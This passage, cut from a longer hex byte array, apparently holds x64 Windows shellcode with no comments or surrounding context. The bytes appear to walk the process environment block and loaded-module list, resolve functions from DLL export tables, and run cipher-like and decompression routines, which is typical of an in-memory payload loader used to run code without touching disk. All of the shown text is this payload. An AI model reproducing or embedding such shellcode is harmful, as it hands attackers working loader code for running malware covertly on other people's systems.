0x24, 0x50, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x05, 0x92, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8d, 0x05, 0x76, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8d, 0x05, 0xd2, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8d, 0x05, 0x66, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8d, 0x05, 0x5a, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8d, 0x45, 0x40, 0x48, \n  0x89, 0x45, 0x08, 0x48, 0x89, 0x75, 0x00, 0xe8, 0x90, 0xe5, 0xff, 0xff, \n  0x33, 0xd2, 0x33, 0xc9, 0xff, 0x96, 0xa8, 0x01, 0x00, 0x00, 0x85, 0xc0, \n  0x0f, 0x85, 0x4c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x60, 0x03, 0x00, \n  0x00, 0x33, 0xd2, 0x4c, 0x8d, 0x8e, 0xd0, 0x08, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x48, 0x8d, 0x8e, 0xb0, 0x08, 0x00, 0x00, 0x44, 0x8d, \n  0x43, 0x04, 0xff, 0x96, 0xb0, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, \n  0x1e, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, \n  0x8d, 0x96, 0x10, 0x09, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0x70, 0x03, 0x00, \n  0x00, 0x48, 0x8b, 0x01, 0xff, 0x10, 0x85, 0xc0, 0x0f, 0x85, 0xe2, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 0x8d, 0x70, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x18, 0x85, 0xc0, 0x0f, 0x85, 0xc0, 0x00, 0x00, 0x00, 0x48, \n  0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0x89, \n  0x4d, 0x20, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x0f, 0x85, \n  0xa3, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0xc7, \n  0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x86, 0x11, 0x06, \n  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x44, 0x8b, 0xcb, 0x33, 0xd2, \n  0x33, 0xc9, 0xff, 0x56, 0x70, 0x48, 0x8d, 0x8d, 0x30, 0x01, 0x00, 0x00, \n  0xff, 0x96, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, \n  0x00, 0x44, 0x8d, 0x43, 0x03, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xf8, 0x4c, \n  0x8b, 0x09, 0x41, 0xff, 0x51, 0x40, 0x48, 0x8b, 0xcf, 0x8b, 0xd8, 0xff, \n  0x96, 0x38, 0x01, 0x00, 0x00, 0x85, 0xdb, 0x75, 0x4a, 0x48, 0x83, 0x64, \n  0x24, 0x48, 0x00, 0x45, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x40, 0x00, \n  0x45, 0x33, 0xc0, 0x21, 0x5c, 0x24, 0x38, 0x49, 0x8b, 0xd6, 0x48, 0x8b, \n  0x8d, 0x70, 0x03, 0x00, 0x00, 0x21, 0x5c, 0x24, 0x30, 0x48, 0x83, 0x64, \n  0x24, 0x28, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x28, 0x85, 0xc0, 0x75, 0x10, 0x48, 0x8b, 0x8d, 0x60, 0x03, \n  0x00, 0x00, 0x8d, 0x53, 0x02, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x28, 0x48, \n  0x8b, 0x8d, 0x70, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, \n  0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, \n  0x38, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, \n  0x50, 0x10, 0x44, 0x8b, 0x86, 0x58, 0x0d, 0x00, 0x00, 0x33, 0xd2, 0x49, \n  0x8b, 0xce, 0x46, 0x8d, 0x04, 0x45, 0x02, 0x00, 0x00, 0x00, 0xe8, 0xb5, \n  0x0a, 0x00, 0x00, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0xc0, 0x00, 0x00, 0x49, \n  0x8b, 0xce, 0xff, 0x56, 0x50, 0x4c, 0x8d, 0x9c, 0x24, 0x40, 0x04, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x28, 0x49, 0x8b, 0x73, 0x38, 0x49, 0x8b, 0xe3, \n  0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, \n  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0xb0, \n  0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, \n  0x48, 0x8b, 0xf1, 0x48, 0x81, 0xc1, 0x48, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xea, 0x4c, 0x8b, 0x78, 0x60, 0xff, 0x56, 0x40, 0x33, 0xc9, 0x4c, 0x63, \n  0x48, 0x3c, 0x4c, 0x03, 0xc8, 0x45, 0x0f, 0xb7, 0x51, 0x14, 0x45, 0x0f, \n  0xb7, 0x41, 0x06, 0x4d, 0x03, 0xd1, 0x45, 0x85, 0xc0, 0x74, 0x19, 0x44, \n  0x8b, 0x8e, 0x40, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x14, 0x89, 0x45, 0x39, \n  0x4c, 0xd2, 0x18, 0x74, 0x3c, 0xff, 0xc1, 0x41, 0x3b, 0xc8, 0x72, 0xee, \n  0x8b, 0x9c, 0x24, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xbc, 0x24, 0xe0, \n  0x00, 0x00, 0x00, 0xff, 0x96, 0xc0, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x85, \n  0xdb, 0x74, 0x3a, 0x4c, 0x8b, 0xc7, 0x49, 0x8d, 0x48, 0x08, 0x4d, 0x8b, \n  0xf0, 0x4c, 0x8b, 0xc1, 0x48, 0x39, 0x01, 0x74, 0x1a, 0xff, 0xc2, 0x3b, \n  0xd3, 0x72, 0xeb, 0xeb, 0x28, 0x41, 0x8b, 0x7c, 0xd2, 0x24, 0x41, 0x8b, \n  0x5c, 0xd2, 0x20, 0x48, 0x03, 0xf8, 0xc1, 0xeb, 0x03, 0xeb, 0xc8, 0x48, \n  0x8b, 0xd5, 0x49, 0x8b, 0xce, 0xff, 0x96, 0xf0, 0x01, 0x00, 0x00, 0xeb, \n  0x08, 0x4c, 0x8b, 0xb4, 0x24, 0xe0, 0x00, 0x00, 0x00, 0xff, 0x96, 0xb8, \n  0x00, 0x00, 0x00, 0x33, 0xed, 0x44, 0x8d, 0x4d, 0x01, 0x85, 0xdb, 0x74, \n  0x41, 0x48, 0x8d, 0x4f, 0x08, 0x48, 0x39, 0x01, 0x74, 0x0d, 0x41, 0x03, \n  0xe9, 0x48, 0x83, 0xc1, 0x08, 0x3b, 0xeb, 0x72, 0xf0, 0xeb, 0x2b, 0x45, \n  0x8a, 0xc1, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x49, 0x8b, 0xd6, 0xff, 0x96, \n  0xd0, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x0c, 0xef, 0x41, 0xb8, 0x10, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x20, 0xe8, 0x54, 0x09, 0x00, 0x00, \n  0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x47, 0x18, 0x48, 0x8b, \n  0x78, 0x10, 0xe9, 0x02, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0xa6, 0x70, 0x03, \n  0x00, 0x00, 0x41, 0x8a, 0x0c, 0x24, 0x33, 0xed, 0x33, 0xd2, 0x45, 0x8b, \n  0xf9, 0x84, 0xc9, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, 0x45, 0x33, 0xc0, \n  0x80, 0xf9, 0x3b, 0x74, 0x2e, 0x81, 0xfa, 0x80, 0x00, 0x00, 0x00, 0x73, \n  0x26, 0x33, 0xc0, 0x42, 0x88, 0x4c, 0x04, 0x30, 0x80, 0xf9, 0x77, 0x41, \n  0x0f, 0x45, 0xc7, 0x80, 0xf9, 0x70, 0x44, 0x8b, 0xf8, 0x41, 0x0f, 0x44, \n  0xe9, 0x41, 0x03, 0xd1, 0x44, 0x8b, 0xc2, 0x42, 0x8a, 0x0c, 0x22, 0x84, \n  0xc9, 0x75, 0xcd, 0x85, 0xd2, 0x0f, 0x84, 0xa7, 0x00, 0x00, 0x00, 0x8d, \n  0x4a, 0x01, 0xc6, 0x44, 0x14, 0x30, 0x00, 0x48, 0x8b, 0x57, 0x30, 0x4c, \n  0x8d, 0x44, 0x24, 0x30, 0x4c, 0x03, 0xe1, 0x45, 0x33, 0xc9, 0x48, 0x8b, \n  0xce, 0xe8, 0xa2, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0x41, 0xb9, 0x01, \n  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x82, 0x45, 0x85, 0xff, 0x74, \n  0x38, 0x85, 0xed, 0x74, 0x14, 0xff, 0xd3, 0x48, 0x8b, 0xd8, 0x41, 0xb9, \n  0x01, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x65, 0xff, 0xff, \n  0xff, 0x48, 0x8b, 0x13, 0x48, 0x8b, 0xce, 0xe8, 0xa4, 0xe5, 0xff, 0xff, \n  0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x4c, 0xff, \n  0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x28, 0xeb, 0x35, 0x85, 0xed, 0x74, \n  0x14, 0xff, 0xd3, 0x48, 0x8b, 0xd8, 0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0x2d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x13, \n  0x48, 0x8b, 0xce, 0xe8, 0x6c, 0xe5, 0xff, 0xff, 0x41, 0xb9, 0x01, 0x00, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x14, 0xff, 0xff, 0xff, 0x49, 0x8b, \n  0x46, 0x08, 0x48, 0x89, 0x03, 0xe9, 0x08, 0xff, 0xff, 0xff, 0x48, 0x8b, \n  0x3f, 0x48, 0x83, 0x7f, 0x30, 0x00, 0x0f, 0x85, 0xf3, 0xfe, 0xff, 0xff, \n  0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x41, 0x8b, 0xc1, 0x49, \n  0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0x73, 0x48, 0x49, \n  0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, \n  0x83, 0xec, 0x60, 0x41, 0x83, 0xca, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x8b, \n  0xf1, 0x44, 0x38, 0x02, 0x74, 0x19, 0x41, 0x83, 0xf8, 0x40, 0x73, 0x13, \n  0x41, 0x8a, 0x04, 0x10, 0x42, 0x88, 0x44, 0x04, 0x20, 0x41, 0xff, 0xc0, \n  0x41, 0x80, 0x3c, 0x10, 0x00, 0x75, 0xe7, 0x41, 0x8d, 0x40, 0xfc, 0x42, \n  0xc6, 0x44, 0x04, 0x20, 0x00, 0x80, 0x7c, 0x04, 0x20, 0x2e, 0x74, 0x2a, \n  0x42, 0xc6, 0x44, 0x04, 0x20, 0x2e, 0x41, 0xff, 0xc0, 0x42, 0xc6, 0x44, \n  0x04, 0x20, 0x64, 0x41, 0xff, 0xc0, 0x42, 0xc6, 0x44, 0x04, 0x20, 0x6c, \n  0x41, 0xff, 0xc0, 0x41, 0x8d, 0x40, 0x01, 0x42, 0xc6, 0x44, 0x04, 0x20, \n  0x6c, 0xc6, 0x44, 0x04, 0x20, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x48, 0x60, 0x48, 0x8b, 0x41, 0x18, 0x48, \n  0x8b, 0x78, 0x10, 0x48, 0x8b, 0x5f, 0x30, 0x48, 0x85, 0xdb, 0x74, 0x39, \n  0x48, 0x63, 0x43, 0x3c, 0x8b, 0x8c, 0x18, 0x88, 0x00, 0x00, 0x00, 0x33, \n  0xc0, 0x85, 0xc9, 0x74, 0x1b, 0x8b, 0x54, 0x19, 0x0c, 0x48, 0x8d, 0x4c, \n  0x24, 0x20, 0x48, 0x03, 0xd3, 0xe8, 0xba, 0x07, 0x00, 0x00, 0x44, 0x8b, \n  0xd0, 0x33, 0xc0, 0x45, 0x85, 0xd2, 0x74, 0x25, 0x48, 0x8b, 0x3f, 0x45, \n  0x85, 0xd2, 0x75, 0xc3, 0x48, 0x85, 0xc0, 0x75, 0x08, 0x48, 0x8d, 0x4c, \n  0x24, 0x20, 0xff, 0x56, 0x30, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, \n  0x74, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5f, 0xc3, 0x48, 0x8b, 0xc3, \n  0xeb, 0xeb, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4c, 0x89, 0x44, \n  0x24, 0x18, 0x48, 0x89, 0x4c, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x54, \n  0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, \n  0x00, 0x45, 0x33, 0xdb, 0x48, 0x8b, 0xfa, 0x4c, 0x8b, 0xd1, 0x41, 0x8b, \n  0xdb, 0x48, 0x85, 0xd2, 0x0f, 0x84, 0x52, 0x01, 0x00, 0x00, 0x4c, 0x63, \n  0x7a, 0x3c, 0x41, 0x8b, 0x84, 0x17, 0x88, 0x00, 0x00, 0x00, 0x85, 0xc0, \n  0x0f, 0x84, 0x3e, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x34, 0x02, 0x44, 0x8b, \n  0x76, 0x1c, 0x44, 0x8b, 0x6e, 0x20, 0x4c, 0x03, 0xf2, 0x44, 0x8b, 0x66, \n  0x24, 0x4c, 0x03, 0xea, 0x4c, 0x03, 0xe2, 0x4d, 0x85, 0xc0, 0x0f, 0x84, \n  0x0c, 0x01, 0x00, 0x00, 0x8b, 0x6e, 0x18, 0x85, 0xed, 0x0f, 0x84, 0x11, \n  0x01, 0x00, 0x00, 0x8d, 0x45, 0xff, 0x49, 0x8b, 0xd0, 0x41, 0x8b, 0x4c, \n  0x85, 0x00, 0x8b, 0xe8, 0x48, 0x03, 0xcf, 0x48, 0x89, 0x84, 0x24, 0xe8, \n  0x00, 0x00, 0x00, 0xe8, 0xd0, 0x06, 0x00, 0x00, 0x45, 0x33, 0xdb, 0x85, \n  0xc0, 0x75, 0x14, 0x48, 0x8b, 0x84, 0x24, 0xe8, 0x00, 0x00, 0x00, 0x41, \n  0x0f, 0xb7, 0x04, 0x44, 0x41, 0x8b, 0x1c, 0x86, 0x48, 0x03, 0xdf, 0x85, \n  0xed, 0x74, 0x0d, 0x4c, 0x8b, 0x84, 0x24, 0xf0, 0x00, 0x00, 0x00, 0x48, \n  0x85, 0xdb, 0x74, 0xb7, 0x4c, 0x8b, 0x94, 0x24, 0xe0, 0x00, 0x00, 0x00, \n  0x48, 0x3b, 0xde, 0x0f, 0x82, 0xa2, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x84, \n  0x3f, 0x8c, 0x00, 0x00, 0x00, 0x48, 0x03, 0xc6, 0x48, 0x3b, 0xd8, 0x0f, \n  0x83, 0x8e, 0x00, 0x00, 0x00, 0x45, 0x8b, 0xc3, 0x44, 0x38, 0x1b, 0x74, \n  0x1e, 0x41, 0x83, 0xf8, 0x3c, 0x73, 0x18, 0x41, 0x8b, 0xc0, 0x8a, 0x0c, \n  0x18, 0x88, 0x4c, 0x04, 0x20, 0x80, 0xf9, 0x2e, 0x74, 0x09, 0x41, 0xff, \n  0xc0, 0x45, 0x38, 0x1c, 0x18, 0x75, 0xe2, 0x41, 0x8d, 0x40, 0x01, 0x8b, \n  0xd0, 0xc6, 0x44, 0x04, 0x20, 0x64, 0x41, 0x8d, 0x40, 0x02, 0xc6, 0x44, \n  0x04, 0x20, 0x6c, 0x41, 0x8d, 0x40, 0x03, 0xc6, 0x44, 0x04, 0x20, 0x6c, \n  0x41, 0x8d, 0x40, 0x04, 0x4c, 0x8d, 0x04, 0x1a, 0x44, 0x88, 0x5c, 0x04, \n  0x20, 0x41, 0x8b, 0xd3, 0x45, 0x38, 0x18, 0x74, 0x17, 0x83, 0xfa, 0x3f, \n  0x73, 0x12, 0x8b, 0xca, 0xff, 0xc2, 0x42, 0x8a, 0x04, 0x01, 0x88, 0x44, \n  0x0c, 0x60, 0x46, 0x38, 0x1c, 0x02, 0x75, 0xe9, 0x8b, 0xc2, 0x4c, 0x8d, \n  0x4c, 0x24, 0x60, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x49, \n  0x8b, 0xca, 0x44, 0x88, 0x5c, 0x04, 0x60, 0xe8, 0xfc, 0xdc, 0xff, 0xff, \n  0x48, 0x8b, 0xd8, 0x48, 0x8b, 0xc3, 0xeb, 0x12, 0x44, 0x2b, 0x4e, 0x10, \n  0x43, 0x8b, 0x1c, 0x8e, 0x48, 0x03, 0xdf, 0xe9, 0x40, 0xff, 0xff, 0xff, \n  0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xf8, 0x00, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0xa0, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, \n  0x48, 0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, \n  0x00, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xe9, 0x45, 0x33, \n  0xd2, 0x4c, 0x8b, 0x48, 0x60, 0x49, 0x8b, 0x41, 0x18, 0x48, 0x8b, 0x58, \n  0x10, 0xeb, 0x1c, 0x4d, 0x85, 0xd2, 0x75, 0x20, 0x4c, 0x8b, 0xcf, 0x4c, \n  0x8b, 0xc6, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcd, 0xe8, 0xbf, 0xda, 0xff, \n  0xff, 0x48, 0x8b, 0x1b, 0x4c, 0x8b, 0xd0, 0x48, 0x8b, 0x43, 0x30, 0x48, \n  0x85, 0xc0, 0x75, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b, 0xc2, \n  0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, \n  0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, \n  0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x41, 0x56, 0x41, 0x57, \n  0x48, 0x83, 0xec, 0x30, 0x33, 0xf6, 0x33, 0xed, 0x45, 0x33, 0xf6, 0x48, \n  0x8b, 0xfa, 0x4c, 0x8b, 0xf9, 0x42, 0x8a, 0x4c, 0x3d, 0x00, 0x84, 0xc9, \n  0x74, 0x14, 0x83, 0xfd, 0x40, 0x74, 0x0f, 0x88, 0x4c, 0x34, 0x20, 0xff, \n  0xc5, 0xff, 0xc6, 0x83, 0xfe, 0x10, 0x75, 0x67, 0xeb, 0x53, 0x8b, 0xc6, \n  0x48, 0x8d, 0x5c, 0x24, 0x20, 0x48, 0x03, 0xd8, 0x41, 0xb8, 0x10, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 0xcb, 0x44, 0x2b, 0xc6, 0x33, 0xd2, 0xe8, 0xcd, \n  0x04, 0x00, 0x00, 0xc6, 0x03, 0x80, 0x83, 0xfe, 0x0c, 0x72, 0x20, 0x48, \n  0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x58, 0x00, 0x00, 0x00, \n  0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x48, 0x33, 0xf8, 0x44, 0x8d, \n  0x42, 0x10, 0xe8, 0xa5, 0x04, 0x00, 0x00, 0x8d, 0x04, 0xed, 0x00, 0x00, \n  0x00, 0x00, 0x41, 0xff, 0xc6, 0x89, 0x44, 0x24, 0x2c, 0x48, 0x8b, 0xd7, \n  0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x2a, 0x00, 0x00, 0x00, 0x48, 0x33, \n  0xf8, 0x33, 0xf6, 0x45, 0x85, 0xf6, 0x0f, 0x84, 0x75, 0xff, 0xff, 0xff, \n  0x48, 0x8b, 0x5c, 0x24, 0x58, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x6c, 0x24, \n  0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, \n  0x41, 0x5e, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x10, 0x0f, 0x10, \n  0x01, 0x48, 0x89, 0x54, 0x24, 0x28, 0x8b, 0xca, 0x44, 0x8b, 0x44, 0x24, \n  0x2c, 0x45, 0x33, 0xd2, 0x0f, 0x11, 0x04, 0x24, 0x8b, 0x54, 0x24, 0x0c, \n  0x44, 0x8b, 0x5c, 0x24, 0x08, 0x8b, 0x5c, 0x24, 0x04, 0x44, 0x8b, 0x0c, \n  0x24, 0x8b, 0xc2, 0xc1, 0xc9, 0x08, 0x41, 0x03, 0xc8, 0x8b, 0xd3, 0x41, \n  0x33, 0xc9, 0xc1, 0xca, 0x08, 0x41, 0x03, 0xd1, 0x41, 0xc1, 0xc0, 0x03, \n  0x41, 0x33, 0xd2, 0x41, 0xc1, 0xc1, 0x03, 0x44, 0x33, 0xca, 0x44, 0x33, \n  0xc1, 0x41, 0xff, 0xc2, 0x41, 0x8b, 0xdb, 0x44, 0x8b, 0xd8, 0x41, 0x83, \n  0xfa, 0x1b, 0x72, 0xcd, 0x89, 0x4c, 0x24, 0x28, 0x44, 0x89, 0x44, 0x24, \n  0x2c, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xc3, \n  0x45, 0x85, 0xc9, 0x0f, 0x84, 0x45, 0x01, 0x00, 0x00, 0x48, 0x89, 0x5c, \n  0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, \n  0x55, 0x41, 0x54, 0x41, 0x56, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x10, \n  0x4c, 0x8b, 0xd9, 0x48, 0x8d, 0x45, 0xf0, 0x4c, 0x2b, 0xd8, 0x4c, 0x8d, \n  0x72, 0x0f, 0x49, 0x8b, 0xf8, 0x41, 0xbc, 0x10, 0x00, 0x00, 0x00, 0x48, \n  0x8d, 0x45, 0xf0, 0x49, 0x3b, 0xc6, 0x77, 0x13, 0x48, 0x8d, 0x45, 0xff, \n  0x48, 0x3b, 0xc2, 0x72, 0x0a, 0x0f, 0x10, 0x02, 0xf3, 0x0f, 0x7f, 0x45, \n  0xf0, 0xeb, 0x08, 0x0f, 0x10, 0x02, 0xf3, 0x0f, 0x7f, 0x45, 0xf0, 0x48, \n  0x8d, 0x4d, 0xf0, 0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x04, \n  0x0b, 0x31, 0x01, 0x48, 0x8d, 0x49, 0x04, 0x49, 0x83, 0xe8, 0x01, 0x75, \n  0xf0, 0x44, 0x8b, 0x45, 0xfc, 0x49, 0x8b, 0xdc, 0x8b, 0x45, 0xf8, 0x44, \n  0x8b, 0x55, 0xf4, 0x8b, 0x4d, 0xf0, 0x41, 0x03, 0xca, 0x41, 0x03, 0xc0, \n  0x41, 0xc1, 0xc2, 0x05, 0x44, 0x33, 0xd1, 0x41, 0xc1, 0xc0, 0x08, 0x44, \n  0x33, 0xc0, 0xc1, 0xc1, 0x10, 0x41, 0x03, 0xc2, 0x41, 0x03, 0xc8, 0x41, \n  0xc1, 0xc2, 0x07, 0x41, 0xc1, 0xc0, 0x0d, 0x44, 0x33, 0xd0, 0x44, 0x33, \n  0xc1, 0xc1, 0xc0, 0x10, 0x48, 0x83, 0xeb, 0x01, 0x75, 0xcc, 0x44, 0x89, \n  0x45, 0xfc, 0x44, 0x8d, 0x43, 0x04, 0x89, 0x4d, 0xf0, 0x48, 0x8d, 0x4d, \n  0xf0, 0x44, 0x89, 0x55, 0xf4, 0x89, 0x45, 0xf8, 0x42, 0x8b, 0x04, 0x19, \n  0x31, 0x01, 0x48, 0x8d, 0x49, 0x04, 0x49, 0x83, 0xe8, 0x01, 0x75, 0xf0, \n  0x45, 0x3b, 0xcc, 0x41, 0x8b, 0xc9, 0x41, 0x0f, 0x47, 0xcc, 0x44, 0x8b, \n  0xd1, 0x85, 0xc9, 0x74, 0x1d, 0x48, 0x8d, 0x5d, 0xf0, 0x4c, 0x8b, 0xc7, \n  0x48, 0x2b, 0xdf, 0x41, 0x8b, 0xf2, 0x42, 0x8a, 0x04, 0x03, 0x41, 0x30, \n  0x00, 0x49, 0xff, 0xc0, 0x48, 0x83, 0xee, 0x01, 0x75, 0xf0, 0x44, 0x2b, \n  0xc9, 0x45, 0x8b, 0xc4, 0x49, 0x03, 0xfa, 0x41, 0x8d, 0x40, 0xff, 0x80, \n  0x04, 0x10, 0x01, 0x75, 0x08, 0x41, 0xff, 0xc8, 0x45, 0x85, 0xc0, 0x7f, \n  0xee, 0x45, 0x85, 0xc9, 0x0f, 0x85, 0x05, 0xff, 0xff, 0xff, 0x48, 0x8b, \n  0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, \n  0x40, 0x48, 0x83, 0xc4, 0x10, 0x41, 0x5e, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, \n  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, \n  0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 0x48, 0x8b, 0xec, 0x48, \n  0x83, 0xec, 0x40, 0x8a, 0x01, 0x41, 0x83, 0xce, 0xff, 0x83, 0x65, 0xf4, \n  0x00, 0x45, 0x33, 0xc9, 0x88, 0x02, 0x33, 0xff, 0x48, 0x8d, 0x42, 0x01, \n  0x48, 0x8b, 0xda, 0x48, 0x89, 0x45, 0xe8, 0x45, 0x8b, 0xde, 0x48, 0x8d, \n  0x41, 0x01, 0x48, 0x89, 0x45, 0xe0, 0x8d, 0x77, 0x01, 0x48, 0x8d, 0x4d, \n  0xe0, 0xe8, 0xf6, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xaa, 0x01, \n  0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0xe5, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x84, 0x9f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, \n  0xd4, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x4e, 0x45, 0x33, 0xc9, 0x45, \n  0x8d, 0x51, 0x04, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0xc0, 0x01, 0x00, 0x00, \n  0x46, 0x8d, 0x0c, 0x48, 0x44, 0x2b, 0xd6, 0x75, 0xee, 0x45, 0x85, 0xc9, \n  0x74, 0x1d, 0x48, 0x8b, 0x55, 0xe8, 0x48, 0x8b, 0xc2, 0x41, 0x8b, 0xc9, \n  0x48, 0x2b, 0xc1, 0x8a, 0x00, 0x88, 0x02, 0x48, 0x03, 0xd6, 0x48, 0x89, \n  0x55, 0xe8, 0xe9, 0x6b, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x45, 0xe8, 0xc6, \n  0x00, 0x00, 0x48, 0x03, 0xc6, 0x48, 0x89, 